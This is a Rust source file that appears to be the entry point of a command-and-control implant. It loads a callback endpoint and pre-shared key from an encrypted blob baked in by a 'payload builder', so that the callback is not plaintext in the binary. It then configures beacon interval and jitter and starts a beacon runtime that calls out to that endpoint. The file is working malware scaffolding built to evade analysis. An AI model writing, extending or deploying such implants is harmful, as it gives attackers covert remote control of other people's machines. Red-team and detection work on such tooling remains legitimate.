use std::time::Duration;

use nw_implant::runtime::{BeaconRuntime, discover_profile};

fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(tracing_subscriber::EnvFilter::from_env("NW_LOG"))
        .init();

    // Compile-time baked config (set by the payload builder at `cargo build`).
    // The builder bakes an encrypted blob (`NW_CFG`) so the callback isn't a
    // plaintext string in the binary; decrypt it back here. Runtime env
    // overrides / legacy plaintext baking are honoured as a dev convenience.
    let (endpoint, psk) = match runtime_cfg() {
        Some(cfg) => cfg,
        None => {
            let e = std::env::var("NW_ENDPOINT")
                .ok()
                .or_else(|| {
                    option_env!("NW_ENDPOINT")
                        .map(str::to_owned)
                        .filter(|s| !s.is_empty())
                })
                .expect("no NW_CFG or NW_ENDPOINT configured");
            let p = std::env::var("NW_PSK")
                .ok()
                .or_else(|| {
                    option_env!("NW_PSK")
                        .map(str::to_owned)
                        .filter(|s| !s.is_empty())
                })
                .unwrap_or_else(|| "dev-psk-change-me".into());
            (e, p)
        }
    };
    let interval_ms = std::env::var("NW_INTERVAL")
        .ok()
        .and_then(|s| s.parse().ok())
        .or_else(|| option_env!("NW_INTERVAL").and_then(|s| s.parse().ok()))
        .unwrap_or(1000);
    let jitter_ms = std::env::var("NW_JITTER")
        .ok()
        .and_then(|s| s.parse().ok())
        .or_else(|| option_env!("NW_JITTER").and_then(|s| s.parse().ok()))
        .unwrap_or(200);

    let profile = discover_profile(
        endpoint,
        Duration::from_millis(interval_ms),
        Duration::from_millis(jitter_ms),
    );
    let runtime = BeaconRuntime::new(profile, psk.into_bytes());

    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async { std::sync::Arc::new(runtime).run().await })?;
    Ok(())
}

/// Runtime-resolvable config: runtime `NW_CFG` env, then BAKED `NW_CFG`, and
/// finally runtime `NW_ENDPOINT`. Returns `(endpoint, psk)`.
fn runtime_cfg() -> Option<(String, String)> {
    let blob = std::env::var("NW_CFG")
        .ok()
        .filter(|s| !s.is_empty())
        .or_else(|| {
            option_env!("NW_CFG")
                .map(str::to_owned)
                .filter(|s| !s.is_empty())
        })?;
    nw_profile::config::decrypt_config(&blob).ok()
}
